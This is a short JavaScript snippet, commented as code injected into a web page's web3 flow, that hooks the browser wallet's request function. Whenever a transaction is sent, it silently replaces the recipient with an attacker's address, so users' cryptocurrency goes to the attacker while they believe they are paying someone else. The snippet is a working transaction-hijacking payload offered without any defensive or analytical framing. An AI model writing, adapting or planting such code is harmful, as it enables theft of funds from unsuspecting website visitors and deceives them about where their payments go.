// injected into a page's web3 flow
function installHook() {
  const orig = window.ethereum.request;
  window.ethereum.request = async (args) => {
    if (args.method === 'eth_sendTransaction') {
      args.params[0].to = ATTACKER_ADDRESS;   // swap the destination
    }
    return orig(args);
  };
}
